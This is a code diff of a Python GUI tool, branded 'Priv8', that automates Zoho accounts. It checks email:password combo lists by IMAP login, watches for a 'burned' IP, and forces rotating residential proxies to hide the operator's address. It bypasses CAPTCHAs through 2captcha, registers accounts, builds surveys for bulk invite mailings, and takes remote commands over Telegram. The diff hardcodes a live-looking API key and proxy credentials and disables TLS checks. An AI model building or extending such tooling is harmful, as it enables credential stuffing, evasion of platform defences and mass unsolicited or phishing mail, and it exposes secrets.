@@ -8,12 +8,9 @@ Tabs:
 
 Run: python zoho_sender_gui.py
 """
-import os, sys, time, random, threading, queue, json, base64, shutil, re, ssl, socket
+import os, sys, time, random, threading, queue, json, base64, shutil, re, ssl
 import imaplib, email as _email_lib, urllib.request, urllib.parse, sqlite3
-import requests
-from dotenv import load_dotenv
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))
 
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -32,12 +29,14 @@ try:
 except AttributeError:
     _OPEN_DLG = webview.OPEN_DIALOG  # type: ignore
 
+import discover_invite as DI
+
 ssl._create_default_https_context = ssl._create_unverified_context
 os.environ["WDM_SSL_VERIFY"] = "0"
 
 DIR        = os.path.dirname(os.path.abspath(__file__))
 CFG_FILE   = os.path.join(DIR, "sender_cfg.json")
-CAPTCHA_KEY = os.getenv("CAPTCHA_KEY", "")  # 2captcha API key from .env
+CAPTCHA_KEY = "c6be7b0c95230d4507de7dac1ef15df0"  # 2captcha API key
 VALID_FILE = os.path.join(DIR, "valid_combos.json")
 PROF_FILE  = os.path.join(DIR, "profiles.json")
 DB_FILE    = os.path.join(DIR, "zoho_sender.db")
@@ -74,22 +73,6 @@ _check_running = False
 _send_running  = False
 window = None
 
-# Error monitoring
-ERROR_LOG_FILE = os.path.join(DIR, "error_log.txt")
-
-def log_error(msg, error_obj=None):
-    """Log error to both console and file"""
-    ts = time.strftime("%Y-%m-%d %H:%M:%S")
-    log_msg = f"[{ts}] {msg}"
-    if error_obj:
-        log_msg += f"\n  {str(error_obj)}"
-    print(log_msg)
-    try:
-        with open(ERROR_LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(log_msg + "\n")
-    except:
-        pass
-
 _CHECK_STATS = {"total": 0, "checked": 0, "valid": 0, "invalid": 0,
                 "error": 0, "skipped": 0, "running": False,
                 "pool": 0, "pool_limit": 50, "checkpoint": 0, "paused": False}
@@ -107,9 +90,28 @@ _pool_monitor_on   = False
 _combo_file_path   = ""   # path to current combo file (for checkpoint persistence)
 
 
-# 
+def _clean_profile_locks(profile_dir):
+    """Remove Chrome Singleton lock files from a specific profile dir only.
+    Kills chromedriver.exe processes but NOT chrome.exe — preserves other Claude Code tabs."""
+    import subprocess
+    # Kill only chromedriver (not chrome.exe) to avoid closing other browser windows
+    subprocess.run(
+        ["taskkill", "/F", "/IM", "chromedriver.exe", "/T"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    # Remove stale lock files from THIS profile only
+    for fname in ["Singleton", "SingletonCookie", "SingletonLock", "lockfile"]:
+        p = os.path.join(profile_dir, fname)
+        try:
+            if os.path.exists(p):
+                os.remove(p)
+        except Exception:
+            pass
+
+
+#
 #  DATABASE  (SQLite  tracks registered accounts)
-# 
+#
 
 def db_init():
     with sqlite3.connect(DB_FILE) as c:
@@ -199,51 +201,42 @@ def _save_profiles(lst):
     os.replace(tmp, PROF_FILE)
 
 def _load_cfg():
-    """Load config from .env first, then sender_cfg.json"""
-    cfg = {}
-
-    # Load from .env (priority 1)
-    proxy_type = os.getenv("PROXY_TYPE", "").strip().lower()
-    proxy_host = os.getenv("PROXY_HOST", "").strip()
-    proxy_port = os.getenv("PROXY_PORT", "").strip()
-    capmonster_key = os.getenv("CAPMONSTER_KEY", "").strip()
-
-    if proxy_host and proxy_port:
-        cfg["proxy_str"] = f"{proxy_host}:{proxy_port}"
-
-    if capmonster_key:
-        cfg["captcha_key"] = capmonster_key
-
-    # Load from sender_cfg.json (priority 2, override with file if exists)
     try:
         if os.path.exists(CFG_FILE):
             with open(CFG_FILE, encoding="utf-8") as f:
-                file_cfg = json.load(f)
-                # File config overrides .env only for specific keys
-                if file_cfg.get("proxy_str"):
-                    cfg["proxy_str"] = file_cfg["proxy_str"]
-                if file_cfg.get("captcha_key"):
-                    cfg["captcha_key"] = file_cfg["captcha_key"]
-                # Merge other settings
-                for k in ["tg_token", "tg_chat", "portal", "survey", "batch_size", "cooldown_min", "cooldown_max", "templates"]:
-                    if k in file_cfg:
-                        cfg[k] = file_cfg[k]
+                return json.load(f)
     except: pass
+    return {}
 
-    return cfg
+TEMPLATES_FILE = os.path.join(DIR, "templates.json")
 
 def _load_templates():
+    # Priority: templates.json file (250 presets) → then cfg embedded → then default
+    if os.path.exists(TEMPLATES_FILE):
+        try:
+            tpls = json.load(open(TEMPLATES_FILE, encoding="utf-8"))
+            if tpls: return tpls
+        except: pass
     cfg = _load_cfg()
     tpls = cfg.get("templates", [])
     if not tpls:
         tpls = [{
+            "id": "default",
+            "name": "Survey Invite",
             "title":    "We'd Love Your Feedback!",
             "subtitle": "Your opinion shapes our future",
+            "banner1": "#0057b8",
+            "banner2": "#00a3e0",
+            "subject":  "Quick Survey — Your Opinion Matters",
             "body":     ("We are conducting a <strong>short 3-minute survey</strong> to better "
                          "understand your needs. Your feedback is extremely valuable to us. "
                          "The survey is completely <strong>anonymous</strong>."),
+            "show_icons": True,
         }]
     return tpls
+
+def _save_templates(tpls):
+    json.dump(tpls, open(TEMPLATES_FILE, "w", encoding="utf-8"), indent=2, ensure_ascii=False)
 
 def _load_send_options():
     cfg = _load_cfg()
@@ -441,39 +434,96 @@ def _tg_send_with_switch_btn(token, chat_id, text, prof_idx):
     except Exception as e:
         CHECK_LOG.put(("dim", f"  TG btn error: {e}"))
 
-# TG callback polling  runs in background, handles "Switch Account" presses
+# TG callback polling  runs in background, handles "Switch Account" + commands
 _tg_poll_offset = 0
 
+def _tg_get_status_text():
+    """Build status summary for /status command."""
+    profiles = _load_profiles()
+    lines = ["<b>[Priv8] Status Report</b>"]
+    for p in profiles:
+        days, hours = _calc_trial_remaining(p.get("connected_at"), p.get("trial_days", 7))
+        trial_str = f"{days}d {hours}h" if days is not None else "?"
+        em = (p.get("email") or "")[:30]
+        st = p.get("status", "free")
+        h  = p.get("health", "ok")
+        sent = p.get("sent_count", 0)
+        lines.append(
+            f"\n<b>Prof {p['idx']}</b> [{st.upper()}] {h}\n"
+            f"  {em or 'No account'}\n"
+            f"  Trial: {trial_str}  |  Sent: {sent}"
+        )
+    valids = _load_valid()
+    pool = sum(1 for v in valids if not v.get("connected_profile") and not v.get("blocked"))
+    lines.append(f"\n<b>Pool:</b> {pool} combos ready")
+    return "\n".join(lines)
+
 def _tg_callback_poll_thread(token, chat_id):
-    """Long-poll Telegram for callback_query (Switch Account button)."""
+    """Long-poll Telegram for callback_query + text commands."""
     global _tg_poll_offset
     if not token or not chat_id: return
     while True:
         try:
             url = (f"https://api.telegram.org/bot{token}/getUpdates"
-                   f"?offset={_tg_poll_offset}&timeout=30&allowed_updates=[\"callback_query\"]")
+                   f"?offset={_tg_poll_offset}&timeout=30"
+                   f"&allowed_updates=[\"callback_query\",\"message\"]")
             resp = urllib.request.urlopen(url, timeout=35)
             data = json.loads(resp.read().decode())
             for upd in data.get("result", []):
                 _tg_poll_offset = upd["update_id"] + 1
+
+                # Handle inline button callbacks
                 cb = upd.get("callback_query")
-                if not cb: continue
-                cb_data = cb.get("data", "")
-                if cb_data.startswith("switch:"):
+                if cb:
+                    cb_data = cb.get("data", "")
+                    if cb_data.startswith("switch:"):
+                        try:
+                            prof_idx = int(cb_data.split(":")[1])
+                            _do_switch_profile(prof_idx, token, chat_id)
+                        except Exception as e:
+                            CHECK_LOG.put(("err", f"  Switch error: {e}"))
+                    # Answer callback to remove spinner
                     try:
-                        prof_idx = int(cb_data.split(":")[1])
-                        _do_switch_profile(prof_idx, token, chat_id)
-                    except Exception as e:
-                        CHECK_LOG.put(("err", f"  Switch error: {e}"))
-                # Answer callback to remove spinner on Telegram
-                try:
-                    ack = urllib.parse.urlencode({
-                        "callback_query_id": cb["id"], "text": "Switching..."
-                    }).encode()
-                    urllib.request.urlopen(
-                        f"https://api.telegram.org/bot{token}/answerCallbackQuery",
-                        ack, timeout=5)
-                except: pass
+                        ack = urllib.parse.urlencode({
+                            "callback_query_id": cb["id"], "text": "Switching..."
+                        }).encode()
+                        urllib.request.urlopen(
+                            f"https://api.telegram.org/bot{token}/answerCallbackQuery",
+                            ack, timeout=5)
+                    except: pass
+                    continue
+
+                # Handle text commands from the configured chat only
+                msg = upd.get("message") or upd.get("edited_message")
+                if not msg: continue
+                msg_chat = str(msg.get("chat", {}).get("id", ""))
+                if msg_chat != str(chat_id): continue
+                text = (msg.get("text") or "").strip().lower()
+
+                if text in ("/status", "status"):
+                    _tg_send(token, chat_id, _tg_get_status_text())
+
+                elif text.startswith("/switch"):
+                    # /switch 2  → switch profile 2
+                    parts = text.split()
+                    if len(parts) >= 2 and parts[1].isdigit():
+                        _do_switch_profile(int(parts[1]), token, chat_id)
+                    else:
+                        _tg_send(token, chat_id, "Usage: /switch <profile_idx>")
+
+                elif text in ("/pause", "pause"):
+                    global _send_running
+                    _send_running = False
+                    _tg_send(token, chat_id, " Send paused (current batch will finish)")
+
+                elif text in ("/help", "help"):
+                    _tg_send(token, chat_id,
+                        "<b>Commands:</b>\n"
+                        "/status — all profiles + trial days + sent count\n"
+                        "/switch N — switch profile N to next combo\n"
+                        "/pause — stop send after current batch\n"
+                        "/help — this message")
+
         except Exception:
             time.sleep(5)
 
@@ -488,6 +538,7 @@ def _do_switch_profile(prof_idx, token="", chat_id=""):
     valids = _load_valid()
     nxt = next((v for v in valids
                 if v.get("connected_profile") is None
+                and not v.get("blocked")
                 and not db_is_registered(v["email"])), None)
     if not nxt:
         _tg_send(token, chat_id, f"No available combo to switch to for Profile {prof_idx}")
@@ -578,22 +629,13 @@ def _combo_thread(combos, tg_token="", tg_chat="", start_idx=0):
             ok, server = _imap_login(email, password)
             _consec_errors = 0
         except Exception as e:
-            error_str = str(e)
-            CHECK_LOG.put(("err", f"    Error: {error_str[:100]}"))
+            CHECK_LOG.put(("err", f"    Error: {e}"))
             _CHECK_STATS["error"] += 1
             _consec_errors += 1
-
-            # Log full error for debugging
-            import traceback
-            log_error(f"IMAP login failed for {email}", e)
-
             if _consec_errors >= IP_BURN_THRESHOLD:
-                msg = (f"[ALERT] Priv8 Combo Checker\n"
-                       f"IP may be BURNED\n"
+                msg = (f"[Priv8] IP may be BURNED\n"
                        f"{_consec_errors} consecutive IMAP errors\n"
-                       f"Last email: {email}\n"
-                       f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
-                       f"Error: {error_str[:80]}")
+                       f"Last email: {email}\nTime: {time.strftime('%H:%M:%S')}")
                 _tg_send(tg_token, tg_chat, msg)
                 CHECK_LOG.put(("err", f"  IP burn warning sent to Telegram ({_consec_errors} errors)"))
                 _consec_errors = 0
@@ -685,23 +727,63 @@ def _pool_monitor_thread(tg_token, tg_chat):
 #  PROFILE CONNECT (Zoho account via IMAP OTP)
 # 
 
-def _solve_image_captcha(driver, img_selector="img[src*='captcha']"):
-    """Send CAPTCHA image to 2captcha and return solved text."""
+def _solve_image_captcha(driver, img_selector="img.za-captcha"):
+    """Send CAPTCHA image to 2captcha using PIL screenshot crop to avoid CORS issues."""
     if not CAPTCHA_KEY:
         return None
     try:
-        # Get image as base64
+        import io
+        try:
+            from PIL import Image as _PILImage
+            _pil_ok = True
+        except ImportError:
+            _pil_ok = False
+
         img_b64 = None
-        # Try screenshot of the captcha element
-        for sel in [img_selector, "#captchaImgDiv img", ".captcha-img", "img[alt*='captcha']",
-                    "img[alt*='CAPTCHA']", "#captchaImg"]:
-            els = driver.find_elements(By.CSS_SELECTOR, sel)
-            if els:
+
+        # PIL screenshot crop method (avoids CORS blocking)
+        if _pil_ok:
+            for sel in [img_selector, "img.za-captcha", "#captchaImgDiv img",
+                        "img[src*='captcha']", "img[alt*='captcha']", "img[alt*='CAPTCHA']"]:
+                els = [e for e in driver.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
+                if not els:
+                    continue
+                cap_el = els[0]
                 try:
-                    img_b64 = els[0].screenshot_as_base64
+                    px_ratio = driver.execute_script("return window.devicePixelRatio || 1")
+                    loc = cap_el.location
+                    sz  = cap_el.size
+                    x   = int(loc["x"] * px_ratio)
+                    y   = int(loc["y"] * px_ratio)
+                    w   = int(sz["width"] * px_ratio)
+                    h   = int(sz["height"] * px_ratio)
+                    pad = 5
+                    full_png = driver.get_screenshot_as_png()
+                    img = _PILImage.open(io.BytesIO(full_png))
+                    img_w, img_h = img.size
+                    crop = img.crop((max(0, x-pad), max(0, y-pad),
+                                     min(img_w, x+w+pad), min(img_h, y+h+pad)))
+                    buf = io.BytesIO()
+                    crop.save(buf, format="PNG")
+                    img_b64 = base64.b64encode(buf.getvalue()).decode()
+                    CHECK_LOG.put(("info", f"  2captcha: PIL crop {w}x{h}px from {sel}"))
                     break
-                except: pass
-        # Fallback: get src and download
+                except Exception as _e:
+                    CHECK_LOG.put(("info", f"  PIL crop failed ({sel}): {_e}"))
+
+        # Fallback: element.screenshot_as_base64
+        if not img_b64:
+            for sel in [img_selector, "#captchaImgDiv img", "img[src*='captcha']",
+                        "img[alt*='captcha']", "img[alt*='CAPTCHA']", "#captchaImg"]:
+                els = driver.find_elements(By.CSS_SELECTOR, sel)
+                if els:
+                    try:
+                        img_b64 = els[0].screenshot_as_base64
+                        CHECK_LOG.put(("info", f"  2captcha: element screenshot from {sel}"))
+                        break
+                    except: pass
+
+        # Fallback: data URI or download src
         if not img_b64:
             for sel in ["img[src*='captcha']", "img[src*='Captcha']"]:
                 els = driver.find_elements(By.CSS_SELECTOR, sel)
@@ -716,15 +798,20 @@ def _solve_image_captcha(driver, img_selector="img[src*='captcha']"):
                             img_b64 = base64.b64encode(data).decode()
                         except: pass
                     break
+
         if not img_b64:
             CHECK_LOG.put(("info", "  2captcha: could not get CAPTCHA image"))
             return None
 
+        if len(img_b64) < 200:
+            CHECK_LOG.put(("err", f"  2captcha: image too small ({len(img_b64)} bytes b64)  skipping"))
+            return None
+
         CHECK_LOG.put(("info", "  2captcha: submitting image..."))
-        # Submit to 2captcha
         post_data = urllib.parse.urlencode({
             "key": CAPTCHA_KEY, "method": "base64",
-            "body": img_b64, "json": 1
+            "body": img_b64, "json": 1,
+            "numeric": 2, "min_len": 4, "max_len": 10, "case_sensitive": 0
         }).encode()
         req = urllib.request.Request("http://2captcha.com/in.php",
                                      data=post_data, method="POST")
@@ -735,7 +822,6 @@ def _solve_image_captcha(driver, img_selector="img[src*='captcha']"):
         task_id = resp["request"]
         CHECK_LOG.put(("info", f"  2captcha task {task_id}  waiting..."))
 
-        # Poll for result (max 90s)
         for _ in range(18):
             time.sleep(5)
             res_url = (f"http://2captcha.com/res.php?key={CAPTCHA_KEY}"
@@ -818,7 +904,7 @@ def _solve_recaptcha(driver, page_url):
 
 
 
-# --- Local Proxy Tunnel (stdlib only, handles user:pass@host:port) ---
+# --- Local Proxy Tunnel (HTTP proxy frontend → SOCKS5 upstream) ---
 import socket as _socket, threading as _threading, base64 as _base64
 
 class _AuthProxyTunnel:
@@ -835,9 +921,43 @@ class _AuthProxyTunnel:
 
     def __init__(self, proxy_str):
         creds, addr = proxy_str.rsplit("@", 1)
+        self._user, pw = creds.split(":", 1)
+        self._pass = pw
         self._user_pass = _base64.b64encode(creds.encode()).decode()
-        self._up_host, p = addr.rsplit(":", 1) if ":" in addr else (addr, "80")
+        self._up_host, p = addr.rsplit(":", 1) if ":" in addr else (addr, "1080")
         self._up_port = int(p)
+        # Detect if upstream is SOCKS5 (not HTTP CONNECT)
+        self._is_socks5 = self._up_port in (1080, 1081, 1082, 1083, 9050, 9150)
+
+    def _connect_upstream(self, dest_host, dest_port):
+        """Open connection to dest via upstream proxy (SOCKS5 or HTTP CONNECT)."""
+        if self._is_socks5:
+            try:
+                import socks as _socks
+                s = _socks.socksocket()
+                s.set_proxy(_socks.SOCKS5, self._up_host, self._up_port,
+                            True, self._user, self._pass)
+                s.settimeout(15)
+                s.connect((dest_host, dest_port))
+                return s
+            except ImportError:
+                pass  # fallback to HTTP CONNECT
+        # HTTP CONNECT fallback
+        up = _socket.create_connection((self._up_host, self._up_port), timeout=15)
+        req = (f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\n"
+               f"Host: {dest_host}:{dest_port}\r\n"
+               f"Proxy-Authorization: Basic {self._user_pass}\r\n"
+               f"Proxy-Connection: keep-alive\r\n\r\n").encode()
+        up.send(req)
+        resp = b""
+        while b"\r\n\r\n" not in resp:
+            c = up.recv(4096)
+            if not c: break
+            resp += c
+        if b"200" not in resp:
+            up.close()
+            raise ConnectionError(f"Upstream CONNECT failed: {resp[:80]}")
+        return up
 
     def start(self):
         srv = _socket.socket()
@@ -872,27 +992,18 @@ class _AuthProxyTunnel:
             if len(parts) < 2:
                 return
             method, target = parts[0], parts[1]
-            up = _socket.create_connection((self._up_host, self._up_port), timeout=15)
             if method.upper() == "CONNECT":
-                req = (
-                    f"CONNECT {target} HTTP/1.1\r\n"
-                    f"Host: {target}\r\n"
-                    f"Proxy-Authorization: Basic {self._user_pass}\r\n"
-                    f"Proxy-Connection: keep-alive\r\n\r\n"
-                ).encode()
-                up.send(req)
-                resp = b""
-                while b"\r\n\r\n" not in resp:
-                    c = up.recv(4096)
-                    if not c:
-                        break
-                    resp += c
-                if b"200" in resp:
-                    cl.send(b"HTTP/1.1 200 Connection established\r\n\r\n")
-                    self._bridge(cl, up)
-                else:
-                    cl.send(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
+                h, p = target.rsplit(":", 1) if ":" in target else (target, "443")
+                up = self._connect_upstream(h, int(p))
+                cl.send(b"HTTP/1.1 200 Connection established\r\n\r\n")
+                self._bridge(cl, up)
             else:
+                # Plain HTTP request — extract host
+                import re as _re
+                m = _re.search(r'Host:\s*([^\r\n:]+)(?::(\d+))?', data.decode("utf-8","replace"), _re.I)
+                h = m.group(1).strip() if m else target.split("/")[0]
+                p = int(m.group(2)) if m and m.group(2) else 80
+                up = self._connect_upstream(h, p)
                 lines = data.decode("utf-8", "replace").split("\r\n")
                 if not any(ln.lower().startswith("proxy-authorization") for ln in lines):
                     lines.insert(1, f"Proxy-Authorization: Basic {self._user_pass}")
@@ -926,8 +1037,8 @@ class _AuthProxyTunnel:
 
 # --- End Local Proxy Tunnel ---
 
-# Default proxy - loaded from .env, not hardcoded
-_DEFAULT_PROXY = None  # Will be loaded from .env if configured
+# Default proxy  every Chrome session MUST use this, never direct IP
+_DEFAULT_PROXY = "gdiwrafcresidential-rotate:mqzo2x6uux4o@p.webshare.io:80"
 _hidden_browser = False
 
 def _build_driver(profile_dir, proxy=None, size=(1200, 900), headless=False):
@@ -943,102 +1054,29 @@ def _build_driver(profile_dir, proxy=None, size=(1200, 900), headless=False):
         opts.add_argument("--window-size=1,1")
     elif size:
         opts.add_argument(f"--window-size={size[0]},{size[1]}")
-
-    # PROXY CONFIGURATION WITH PROXYSCRAPE API SUPPORT
-    proxy_type = os.getenv("PROXY_TYPE", "none").strip().lower()
-    proxy_host = os.getenv("PROXY_HOST", "").strip()
-    proxy_port = os.getenv("PROXY_PORT", "").strip()
-    proxy_user = os.getenv("PROXY_USER", "").strip()
-    proxy_pass = os.getenv("PROXY_PASS", "").strip()
-    proxyscrape_key = os.getenv("PROXYSCRAPE_API_KEY", "").strip()
-
-    use_proxy = False
-
-    # If ProxyScrape API is configured, fetch a fresh proxy for this connection
-    if proxy_type == "proxyscrape_api" and proxyscrape_key:
-        print(f"[PROXY] ProxyScrape API: Fetching fresh proxy...")
+    # Force proxy  never allow direct machine IP
+    if not proxy or not proxy.strip():
+        proxy = _DEFAULT_PROXY
+    p = proxy.strip()
+    if "@" in p:
+        # Detect HTTP proxies (port 80/8080/3128) — use extension-based auth (onAuthRequired)
+        # For SOCKS5 ports (1080-1083, 9050) — use _AuthProxyTunnel
         try:
-            import requests
-            from urllib3.exceptions import InsecureRequestWarning
-            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-            url = "https://api.proxyscrape.com/v2/"
-            params = {
-                "request": "getproxies",
-                "protocol": "http",
-                "timeout": 5000,
-                "ssl": "all",
-                "anonymity": "all",
-                "country": "all",
-                "api_key": proxyscrape_key
-            }
-
-            response = requests.get(url, params=params, timeout=15, verify=False)
-            proxies = response.text.strip().split('\r\n')
-            proxies = [p.strip() for p in proxies if p.strip() and ':' in p]
-
-            if proxies:
-                # Test first 3 proxies to find a working one
-                for test_proxy in proxies[:3]:
-                    ip, port = test_proxy.split(':')
-                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_sock.settimeout(3)
-                    result = test_sock.connect_ex((ip, int(port)))
-                    test_sock.close()
-
-                    if result == 0:
-                        proxy_host = ip
-                        proxy_port = port
-                        print(f"[PROXY] Using fresh proxy from API: {proxy_host}:{proxy_port}")
-                        break
-        except Exception as e:
-            print(f"[PROXY] ProxyScrape API error: {str(e)[:80]}")
-            print(f"[PROXY] Will fallback to direct connection")
-
-    if proxy_type and proxy_type != "none" and proxy_type != "" and proxy_host and proxy_port:
-        print(f"[PROXY] Type: {proxy_type} | Host: {proxy_host} | Port: {proxy_port}")
-
-        try:
-            if proxy_type == "webshare" and proxy_user and proxy_pass:
-                full_proxy = f"{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
-                _apply_proxy_ext(opts, full_proxy)
-                print(f"[PROXY] Webshare extension loaded")
-                use_proxy = True
-            elif proxy_type == "custom" or proxy_type == "proxyscrape" or proxy_type == "proxyscrape_api":
-                print(f"[PROXY] Testing {proxy_host}:{proxy_port}...")
-                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                test_sock.settimeout(5)
-                result = test_sock.connect_ex((proxy_host, int(proxy_port)))
-                test_sock.close()
-
-                if result == 0:
-                    print(f"[PROXY] Port is OPEN - configuring...")
-                    opts.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")
-                    use_proxy = True
-                    print(f"[PROXY] Proxy enabled")
-                else:
-                    print(f"[PROXY] Port CLOSED/UNREACHABLE (error {result})")
-                    print(f"[PROXY] FALLBACK: Using direct connection")
-            else:
-                opts.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")
-                use_proxy = True
-                print(f"[PROXY] Command-line proxy set")
-
-        except Exception as e:
-            print(f"[PROXY] Error: {str(e)[:80]}")
-            print(f"[PROXY] FALLBACK: Using direct connection")
-
-    # If proxy not used, use direct connection
-    if not use_proxy:
-        print(f"[PROXY] Direct connection (no proxy)")
-        opts.add_argument("--no-proxy-server")
-
-    try:
-        d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
-        return d
-    except Exception as e:
-        print(f"[ERROR] ChromeDriver failed: {e}")
-        raise
+            _addr = p.rsplit("@", 1)[1]
+            _pport = int(_addr.rsplit(":", 1)[1]) if ":" in _addr else 8080
+        except Exception:
+            _pport = 0
+        if _pport in (80, 8080, 3128, 8888, 3000):
+            _apply_proxy_ext(opts, p)
+        else:
+            local_port = _AuthProxyTunnel.get_port(p)
+            opts.add_argument(f"--proxy-server=http://127.0.0.1:{local_port}")
+    elif p.startswith(("socks5://","socks4://","http://","https://")):
+        opts.add_argument(f"--proxy-server={p}")
+    else:
+        opts.add_argument(f"--proxy-server=http://{p}")
+    d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
+    return d
 
 def _apply_proxy_ext(opts, s):
     import zipfile, tempfile, os as _os
@@ -1068,6 +1106,9 @@ def _gen_zoho_pw():
     chars = string.ascii_letters + string.digits + "!@#$"
     while True:
         pw = ''.join(secrets.choice(chars) for _ in range(12))
+        # Reject if any 2 consecutive identical chars (Zoho "continuous characters" rule)
+        if any(pw[i] == pw[i+1] for i in range(len(pw)-1)):
+            continue
         if (any(c.isupper() for c in pw) and any(c.islower() for c in pw)
                 and any(c.isdigit() for c in pw) and any(c in "!@#$" for c in pw)):
             return pw
@@ -1086,34 +1127,123 @@ def _extract_portal_dept(url):
         return m.group(1), m.group(2)
     return None, None
 
-def _create_blank_survey(d, portal_id, dept_id):
+def _create_blank_survey(d, portal_id, dept_id, survey_name=None):
     """Navigate to survey creator and create blank survey. Returns survey_id str or None."""
     create_url = (f"https://survey.zoho.com/survey/newui#/portal/{portal_id}"
                   f"/department/{dept_id}/createsurvey/templatesurvey")
     d.get(create_url)
-    time.sleep(5)
-    # Click "Create New Survey" tab
+    time.sleep(6)
+
+    # Click "Create New Survey" tab if visible (may already be selected)
     for sel in [
         "//a[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
         "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
-        "//div[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
     ]:
         els = [e for e in d.find_elements(By.XPATH, sel) if e.is_displayed()]
         if els:
             d.execute_script("arguments[0].click();", els[0])
             time.sleep(3); break
-    # Click "Blank Survey"
-    for sel in [
-        "//a[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'blank')]",
-        "//div[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'blank')]",
-        ".blank-survey", "#blankSurvey",
-    ]:
-        by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
-        els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
-        if els:
-            d.execute_script("arguments[0].click();", els[0])
-            time.sleep(4); break
-    # Wait for survey editor URL with survey ID
+
+    # New Zoho UI: "Create from scratch" card → "Create Survey" button (first one)
+    # Also handles old UI: "Blank Survey" button
+    clicked = False
+    _scratch_kws = ["create from scratch", "blank", "from scratch", "scratch"]
+    for kw in _scratch_kws:
+        # Find the card/section containing this keyword
+        card = d.execute_script(f"""
+            var kw = '{kw}';
+            var all = document.querySelectorAll('*');
+            for (var el of all) {{
+                var t = (el.innerText||'').trim().toLowerCase();
+                if (t === kw || t.startsWith(kw)) {{
+                    // Find Create Survey button inside this card or its parent
+                    var card = el.closest('[class*="card"],[class*="option"],[class*="create"],[class*="box"]') || el.parentElement;
+                    if (card) {{
+                        var btn = card.querySelector('button,a');
+                        if (btn && btn.offsetParent) return btn;
+                    }}
+                }}
+            }}
+            return null;
+        """)
+        if card:
+            d.execute_script("arguments[0].scrollIntoView({block:'center'}); arguments[0].click();", card)
+            CHECK_LOG.put(("info", f"  Create blank survey: clicked '{kw}' card button"))
+            time.sleep(4); clicked = True; break
+
+    if not clicked:
+        # Fallback: click first visible "Create Survey" button
+        btn = d.execute_script("""
+            for (var b of document.querySelectorAll('button,a')) {
+                var t = (b.innerText||b.textContent||'').trim().toLowerCase();
+                if ((t === 'create survey' || t === 'create new survey') && b.offsetParent) return b;
+            } return null;
+        """)
+        if btn:
+            d.execute_script("arguments[0].scrollIntoView({block:'center'}); arguments[0].click();", btn)
+            CHECK_LOG.put(("info", "  Create blank survey: fallback 'Create Survey' button clicked"))
+            time.sleep(4); clicked = True
+
+    if not clicked:
+        CHECK_LOG.put(("err", "  _create_blank_survey: no clickable button found"))
+        return None
+
+    # Handle "Create Survey" modal: fill SURVEY NAME → click CREATE
+    time.sleep(3)
+    try:
+        # Fill survey name field if present
+        name_field = d.execute_script("""
+            for (var inp of document.querySelectorAll('input[type="text"],input:not([type])')) {
+                var lbl = (inp.placeholder||inp.getAttribute('aria-label')||'').toLowerCase();
+                if (lbl.includes('survey name') || lbl.includes('name')) {
+                    if (inp.offsetParent) return inp;
+                }
+            }
+            // fallback: first visible text input in a dialog/modal
+            var modal = document.querySelector('[class*="modal"],[class*="dialog"],[role="dialog"]');
+            if (modal) {
+                for (var inp of modal.querySelectorAll('input[type="text"],input:not([type])')) {
+                    if (inp.offsetParent) return inp;
+                }
+            }
+            return null;
+        """)
+        if name_field:
+            d.execute_script(
+                "arguments[0].value = ''; arguments[0].dispatchEvent(new Event('input',{bubbles:true}));"
+                "arguments[0].focus();",
+                name_field
+            )
+            time.sleep(0.3)
+            # Use JS to type — more reliable than send_keys for shadow/styled inputs
+            d.execute_script(
+                "var inp=arguments[0]; var nv=arguments[1]||'Survey';"
+                "var nd=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');"
+                "nd.set.call(inp,nv);"
+                "inp.dispatchEvent(new Event('input',{bubbles:true}));"
+                "inp.dispatchEvent(new Event('change',{bubbles:true}));",
+                name_field, survey_name or "Survey"
+            )
+            time.sleep(0.5)
+            CHECK_LOG.put(("info", "  Create survey modal: typed name"))
+
+        # Click CREATE button in modal — use find_elements for reliability
+        _all_btns = d.find_elements(By.TAG_NAME, "button")
+        create_btn = None
+        for _b in _all_btns:
+            try:
+                _bt = (_b.get_attribute("innerText") or _b.text or "").strip().upper()
+                if _bt in ("CREATE", "CREATE SURVEY") and _b.is_displayed():
+                    create_btn = _b; break
+            except: pass
+        if create_btn:
+            d.execute_script("arguments[0].scrollIntoView({block:'center'}); arguments[0].click();", create_btn)
+            CHECK_LOG.put(("info", "  Create survey modal: clicked CREATE"))
+            time.sleep(6)
+    except Exception as _e:
+        CHECK_LOG.put(("warn", f"  _create_blank_survey modal error: {_e}"))
+
+    # Wait for survey editor URL with survey ID (up to 40s)
     for _ in range(20):
         time.sleep(2)
         cur = d.current_url
@@ -1127,6 +1257,50 @@ def _create_blank_survey(d, portal_id, dept_id):
         if m: return m.group(1)
     except: pass
     return None
+
+def _add_dummy_question(d, portal_id, dept_id, survey_id):
+    """Add a single text question to a blank survey via the Editor tab."""
+    try:
+        editor_url = (f"https://survey.zoho.com/survey/newui"
+                      f"#/portal/{portal_id}/department/{dept_id}"
+                      f"/survey/{survey_id}/builder")
+        d.get(editor_url)
